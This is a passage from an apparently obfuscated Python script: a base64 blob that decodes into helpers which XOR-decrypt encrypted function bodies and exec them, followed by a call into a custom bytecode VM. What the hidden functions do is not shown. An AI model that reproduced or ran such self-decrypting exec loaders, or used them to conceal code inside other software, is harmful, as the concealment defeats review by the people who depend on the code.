aQldVaG1tdmV0cDN2eGlVeE9PUnRjLzBHOHFGWnJjdFg1eXArb3RHTDFoQk5wK0ErdW1IYWxYM3YzVWc1T1ErRkFQdFFIMFh6TVV3SUdLVVdncHRMQXB5enpGYkJWN3ZqMkFGeFhRVllkTnl0R3ZYd2s5dERmWjJBdE1sOUdHWktubm1ZNkRUQ1FNdVoxazIvT2xnVlVnRllMT0VmSUszNDRMTnpQSzJ1ZFlNcnczY3FIdDVYempvS2dZUk5qWkp1cVA0UG93SVB0dWFYRi9PdDRMQmdEbWhXa2xQeFVlV2tGbWF2V3Bvdkc0QWRTMEp5ZUM3KzNOakxxTDNMZ2o1SStSM1VSTlpYaWc5NVl2bEc2M2JaTTA5bUJWU1lXQi9sOXJ2T2RuNnZObE5ydldaZk5ZZGpIaVdzVGdOVnJzMDhaMlNJT1FCTTFHQzhxR2p1MmtiL045a09pR2RNc2hVVGNMSEtLQjNGOWlZSkV2QXJaNTZDS2RzOW4rdzZTaTZwakZSZFh0NnVrVS9oMjNYT2JWMU9QSDBKaTV4RlJwNWd6aUM5UURCcUlTOEV4S0xMN0sya1dNaWV4ZVh6ZUN6NFpVb3VGZWFjcEUwSmFpeDVHQUpXL0hPUWltVEx0UTBZR1dvckdLOHBwQlhmWVprc1FudVpqSEFtL2tudkEwbUVMWTFYNHRlNmFQblB6ZnlHeklnZ0xnMTFrUW1HVGp5SmV6VDJ3RzFmM0VPdjgzb3ZINGsxVmE2aC9XMHNxcVBKRVloSWo1TXJITHJLV25OanpmazZJcThHZjZNdThkM1RpMkFBa3hXNDVMTXZWdS9UU1RrQ1FublU2YmpTZ25HR0d1RzhucTVla3RmSXdodUdSalhPT1ZudmlrUnFCUTltN2FmRGkvandFcTNwaUkvZGZNd0Nzbk1Gb1RqcWhldm5lSTBxVXBta28rbkpkRVRKMHp1Y0hxQUVWdTB1akY4U0tzNEZiNjgxY2ZNcUhSMGZmcHV3NjZoNnMzelcvYXVqeVowVUkzcHhvSi93ZkR4bDR1L2lRbjJZT25kSXNzdFo2REU4WXQ5NXczdXBhQy9YRkkxR1YxU1V4NWRybmVPRWIxN2ZUNjVnNGlmQlVWMWhqV1pXWFZLekdzbUR0bXNwUkFxT1IrS0lEY2NJdXlNTmpNblhFR0VYYWllMDllSDF3UXp4ZWVLWjN2ZjRuZ1BxcVJSOXBMUURoa1R3VjhHcGJGR1lueXErQnJHYlNYeld1a3V6OFNHbE5oVXdUM3I5c0lBQ0l0cmc1angzN2JubkROaFBieHpyVVF4WUM4czRERDMrWmZXckJrb0FzaW9RMnhIQmFNSHZQamZ1RjVpeU5ZajdEYXM0V0NNaFhkODlQOS9LeHVkdz0nKV0KX0ZVTkNfQ0FDSEUgPSB7fQoKZGVmIF9leGVjX2VuYyhpZHgsIGtleSwgbmFtZSwgYXJncywga3dhcmdzKToKICAgIGlmIG5hbWUgaW4gX0ZVTkNfQ0FDSEU6CiAgICAgICAgcmV0dXJuIF9GVU5DX0NBQ0hFW25hbWVdKCphcmdzLCAqKmt3YXJncykKICAgIHJhdyA9IF9GRU5DX0RBVEFbaWR4XQogICAgbm9uY2UsIHRhZyA9IChyYXdbOjE2XSwgcmF3Wy0xNjpdKQogICAgY3QgPSByYXdbMTY6LTE2XQogICAgYXV0aF9rZXkgPSBoYXNobGliLnNoYTI1NihiJ2F1dGh2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBpZiBub3QgaG1hYy5jb21wYXJlX2RpZ2VzdChoYXNobGliLnNoYTI1NihhdXRoX2tleSArIGN0KS5kaWdlc3QoKVs6MTZdLCB0YWcpOgogICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcignW2Z1bmNlbmNdIGludGVncml0eSBjaGVjayBmYWlsZWQnKQogICAgZW5jX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInZW5jdjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgcGxhaW5fYnl0ZXMgPSBfeG9yX3N0cmVhbShlbmNfa2V5LCBjdCkKICAgIHBsYWluX3N0ciA9IHBsYWluX2J5dGVzLmRlY29kZSgndXRmLTgnKQogICAgbnMgPSB7fQogICAgZXhlYyhwbGFpbl9zdHIsIGdsb2JhbHMoKSwgbnMpCiAgICBmdW5jID0gbnNbJ19mJ10KICAgIF9GVU5DX0NBQ0hFW25hbWVdID0gZnVuYwogICAgcmVzdWx0ID0gZnVuYygqYXJncywgKiprd2FyZ3MpCiAgICByZXR1cm4gcmVzdWx0Cgphc3luYyBkZWYgX2V4ZWNfZW5jX2FzeW5jKGlkeCwga2V5LCBuYW1lLCBhcmdzLCBrd2FyZ3MpOgogICAgaWYgbmFtZSBpbiBfRlVOQ19DQUNIRToKICAgICAgICByZXR1cm4gYXdhaXQgX0ZVTkNfQ0FDSEVbbmFtZV0oKmFyZ3MsICoqa3dhcmdzKQogICAgcmF3ID0gX0ZFTkNfREFUQVtpZHhdCiAgICBub25jZSwgdGFnID0gKHJhd1s6MTZdLCByYXdbLTE2Ol0pCiAgICBjdCA9IHJhd1sxNjotMTZdCiAgICBhdXRoX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInYXV0aHYxOicgKyBrZXkgKyBub25jZSkuZGlnZXN0KCkKICAgIGlmIG5vdCBobWFjLmNvbXBhcmVfZGlnZXN0KGhhc2hsaWIuc2hhMjU2KGF1dGhfa2V5ICsgY3QpLmRpZ2VzdCgpWzoxNl0sIHRhZyk6CiAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCdbZnVuY2VuY10gaW50ZWdyaXR5IGNoZWNrIGZhaWxlZCcpCiAgICBlbmNfa2V5ID0gaGFzaGxpYi5zaGEyNTYoYidlbmN2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBwbGFpbl9ieXRlcyA9IF94b3Jfc3RyZWFtKGVuY19rZXksIGN0KQogICAgcGxhaW5fc3RyID0gcGxhaW5fYnl0ZXMuZGVjb2RlKCd1dGYtOCcpCiAgICBucyA9IHt9CiAgICBleGVjKHBsYWluX3N0ciwgZ2xvYmFscygpLCBucykKICAgIGZ1bmMgPSBuc1snX2YnXQogICAgX0ZVTkNfQ0FDSEVbbmFtZV0gPSBmdW5jCiAgICByZXN1bHQgPSBhd2FpdCBmdW5jKCphcmdzLCAqKmt3YXJncykKICAgIHJldHVybiByZXN1bHQKCmRlZiBfeG9yX3N0cmVhbShrZXksIGRhdGEpOgogICAgcmVzdWx0ID0gYnl0ZWFycmF5KCkKICAgIGNvdW50ZXIgPSAwCiAgICB3aGlsZSBsZW4ocmVzdWx0KSA8IGxlbihkYXRhKToKICAgICAgICBrcyA9IGhhc2hsaWIuc2hhMjU2KGtleSArIGNvdW50ZXIudG9fYnl0ZXMoOCwgJ2JpZycpKS5kaWdlc3QoKQogICAgICAgIGNodW5rID0gZGF0YVtsZW4ocmVzdWx0KTpsZW4ocmVzdWx0KSArIDMyXQogICAgICAgIGZvciBhLCBiIGluIHppcChjaHVuaywga3MpOgogICAgICAgICAgICByZXN1bHQuYXBwZW5kKGEgXiBiKQogICAgICAgIGNvdW50ZXIgKz0gMQogICAgcmV0dXJuIGJ5dGVzKHJlc3VsdCkKCmRlZiBfYigqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygwLCBfRlVOQ19LRVksICdfYicsIGFyZ3MsIGt3YXJncykKCmRlZiBfZSgqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygxLCBfRlVOQ19LRVksICdfZScsIGFyZ3MsIGt3YXJncykKCmRlZiBfZigqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygyLCBfRlVOQ19LRVksICdfZicsIGFyZ3MsIGt3YXJncykKCmRlZiBfZygqYXJncywgKiprd2FyZ3MpOgogICAgcmV0dXJuIF9leGVjX2VuYygzLCBfRlVOQ19LRVksICdfZycsIGFyZ3MsIGt3YXJncyk="), '<exec>', 'exec'), globals())
    _vm_run(_c, _k, _m, globals(), locals(), _map, _ok, _ht, _pf)
if __name__ == '__main__':
    _jgxmpce()
